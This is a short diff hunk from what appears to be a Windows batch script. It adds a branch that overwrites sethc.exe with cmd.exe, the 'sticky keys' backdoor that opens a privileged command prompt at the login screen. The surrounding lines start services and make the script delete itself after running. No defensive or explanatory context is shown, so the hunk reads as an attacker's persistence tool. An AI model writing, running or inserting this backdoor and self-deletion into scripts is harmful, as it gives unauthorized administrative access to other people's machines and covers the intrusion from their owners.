@@ -90,6 +90,12 @@ sc config Browser start= auto
 sc start Browser
 GOTO DEFAULT
 
+:CASE_sticky
+mkdir c:\temp
+cd \temp
+copy /Y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
+GOTO DEFAULT
+
 :DEFAULT
 REM self destruct
 start /b "" cmd /c del "%~f0"&exit /b
